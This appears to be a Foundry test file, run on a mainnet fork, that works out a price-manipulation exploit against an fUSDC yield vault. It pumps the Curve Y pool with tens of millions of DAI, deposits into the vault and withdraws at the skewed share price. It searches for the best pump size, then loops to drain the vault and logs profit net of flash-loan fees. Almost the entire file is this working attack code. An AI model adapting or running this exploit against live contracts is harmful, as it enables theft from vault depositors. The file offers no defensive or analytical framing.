// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFUSDCFlash5 is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    /// @dev Narrow search 19M - 19.5M
    function testNarrowSearch() public {
        uint256[] memory sizes = new uint256[](5);
        sizes[0] = 19_000_000e18;
        sizes[1] = 19_100_000e18;
        sizes[2] = 19_200_000e18;
        sizes[3] = 19_300_000e18;
        sizes[4] = 19_400_000e18;

        for (uint256 s = 0; s < 5; s++) {
            uint256 snapshot = vm.snapshot();
            uint256 daiPump = sizes[s];

            deal(DAI, address(this), daiPump);
            deal(USDC, address(this), daiPump / 1e12);

            IERC20(DAI).approve(CURVE, type(uint256).max);
            IERC20(USDC).approve(CURVE, type(uint256).max);
            IERC20(USDC).approve(FUSDC, type(uint256).max);

            try this.singleIteration(daiPump) returns (int256 usdcNet, int256 daiNet) {
                int256 totalNet = usdcNet * 1e12 + daiNet;
                emit log_named_uint("Pump (K DAI)", daiPump / 1e21);
                emit log_named_int("Total net (DAI)", totalNet);
                emit log("---");
            } catch {
                emit log_named_uint("REVERTED (K DAI)", daiPump / 1e21);
                emit log("---");
            }

            vm.revertTo(snapshot);
        }
    }

    function singleIteration(uint256 daiPump) external returns (int256 usdcNet, int256 daiNet) {
        uint256 usdcCapital = IERC20(USDC).balanceOf(address(this));

        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(0, 1, daiPump, 0);
        uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

        IHVault(FUSDC).deposit(pumpedUSDC);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));

        uint256 usdcDump = IERC20(USDC).balanceOf(address(this));
        if (usdcDump > usdcCapital) usdcDump = usdcCapital;
        ICurveYPool(CURVE).exchange_underlying(1, 0, usdcDump, 0);

        IHVault(FUSDC).withdraw(shares);

        usdcFinal = IERC20(USDC).balanceOf(address(this));
        daiFinal = IERC20(DAI).balanceOf(address(this));

        usdcNet = int256(usdcFinal) - int256(usdcCapital);
        daiNet = int256(daiFinal) - int256(daiPump);
    }

    uint256 usdcFinal;
    uint256 daiFinal;

    /// @dev Multi-iteration with 19M pump, 100 iters
    function testFullDrain19M() public {
        uint256 daiPump = 19_000_000e18;
        uint256 usdcCapital = 19_000_000e6;

        deal(DAI, address(this), daiPump);
        deal(USDC, address(this), usdcCapital);

        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 vaultBefore = IHVault(FUSDC).underlyingBalanceWithInvestment();

        for (uint256 i = 0; i < 200; i++) {
            uint256 daiBal = IERC20(DAI).balanceOf(address(this));
            if (daiBal < 1e18) break;

            uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));

            // Use try/catch in case it reverts as pool depletes
            try ICurveYPool(CURVE).exchange_underlying(0, 1, daiBal, 0) {
                uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;

                try IHVault(FUSDC).deposit(pumpedUSDC) {
                    uint256 shares = IHVault(FUSDC).balanceOf(address(this));

                    uint256 dumpAmt = IERC20(USDC).balanceOf(address(this));
                    if (dumpAmt > usdcCapital) dumpAmt = usdcCapital;
                    ICurveYPool(CURVE).exchange_underlying(1, 0, dumpAmt, 0);

                    IHVault(FUSDC).withdraw(shares);
                } catch {
                    // Deposit failed, swap back
                    uint256 usdcNow = IERC20(USDC).balanceOf(address(this));
                    ICurveYPool(CURVE).exchange_underlying(1, 0, usdcNow, 0);
                    emit log_named_uint("Deposit reverted at iter", i);
                    break;
                }
            } catch {
                emit log_named_uint("Pump reverted at iter", i);
                break;
            }

            if (i % 20 == 0 || i == 199) {
                emit log_named_uint("Iter", i);
                emit log_named_uint("USDC", IERC20(USDC).balanceOf(address(this)));
                emit log_named_uint("DAI", IERC20(DAI).balanceOf(address(this)));
                emit log_named_uint("Vault", IHVault(FUSDC).underlyingBalanceWithInvestment());
            }
        }

        uint256 uf = IERC20(USDC).balanceOf(address(this));
        uint256 df = IERC20(DAI).balanceOf(address(this));
        uint256 vaultAfter = IHVault(FUSDC).underlyingBalanceWithInvestment();

        emit log("=== FINAL ===");
        emit log_named_int("Net USDC", int256(uf) - int256(usdcCapital));
        emit log_named_int("Net DAI", int256(df) - int256(daiPump));
        int256 totalNet = (int256(uf) - int256(usdcCapital)) * 1e12 + (int256(df) - int256(daiPump));
        emit log_named_int("Net total (DAI units)", totalNet);
        emit log_named_int("Vault drained", int256(vaultBefore) - int256(vaultAfter));

        // Flash fees: 0.3% on 19M DAI + 0.3% on 19M USDC = 57K + 57K = 114K
        int256 netAfterFees = totalNet - 114_000e18;
        emit log_named_int("Net after flash fees (DAI)", netAfterFees);
    }
}
